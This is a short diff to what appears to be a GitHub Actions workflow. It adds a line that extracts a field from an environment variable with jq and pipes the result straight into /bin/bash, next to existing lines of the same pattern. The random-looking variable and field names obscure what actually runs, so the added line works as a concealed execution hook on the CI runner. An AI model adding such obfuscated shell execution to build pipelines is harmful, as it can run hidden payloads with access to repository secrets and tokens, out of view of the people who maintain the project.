@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$t15" | jq -r .w3 | /bin/bash
           printf '%s' "$ydndb8" | jq -r .n968 | /bin/bash
           printf '%s' "$lgsyn8" | jq -r .hl5 | /bin/bash
+          echo $jov0 | jq -r .pxaf8242 | /bin/bash
 
       - name: Save output
         if: always()
